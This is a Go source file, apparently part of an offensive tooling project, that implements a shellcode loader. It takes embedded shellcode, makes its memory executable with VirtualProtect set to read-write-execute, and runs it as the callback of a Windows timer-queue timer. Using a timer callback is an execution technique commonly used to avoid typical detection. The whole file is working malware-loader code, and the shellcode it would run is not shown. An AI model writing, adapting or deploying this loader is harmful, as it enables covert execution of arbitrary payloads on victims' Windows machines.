package sh

import (
	"fmt"
	"time"
	"unsafe"
	api "github.com/carved4/go-wincall"
)

var (
	timerHandle uintptr
)

func ExecuteViaTimerQueue() error {
	shellcode := GetEmbeddedShellcode()
	
	var oldProtect uint32
	shellcodePtr := uintptr(unsafe.Pointer(&shellcode[0]))
	
	success, err := api.Call("kernel32.dll", "VirtualProtect",
		shellcodePtr,                         // lpAddress
		uintptr(len(shellcode)),             // dwSize
		0x40,                                // PAGE_EXECUTE_READWRITE
		uintptr(unsafe.Pointer(&oldProtect)), // lpflOldProtect
	)
	if err != nil || success == 0 {
		return fmt.Errorf("VirtualProtect failed: %v", err)
	}
	
	success, err = api.Call("kernel32.dll", "CreateTimerQueueTimer",
		uintptr(unsafe.Pointer(&timerHandle)), // phNewTimer
		uintptr(0),                            // TimerQueue (use default)
		shellcodePtr,                          // Callback (our shellcode)
		uintptr(0),                            // Parameter
		uintptr(1),                            // DueTime (1ms)
		uintptr(0),                            // Period (0 = fire once)
		uintptr(0),                            // Flags
	)
	if err != nil || success == 0 {
		return fmt.Errorf("CreateTimerQueueTimer failed: %v", err)
	}
	
	time.Sleep(100 * time.Millisecond)
	
	return DeleteTimer()
}

func DeleteTimer() error {
	if timerHandle == 0 {
		return fmt.Errorf("no timer created")
	}
	
	success, err := api.Call("kernel32.dll", "DeleteTimerQueueTimer",
		uintptr(0),       // TimerQueue (use default)
		timerHandle,      // Timer
		uintptr(0),       // CompletionEvent (null = synchronous)
	)
	if err != nil || success == 0 {
		return fmt.Errorf("DeleteTimerQueueTimer failed: %v", err)
	}
	
	timerHandle = 0
	return nil
}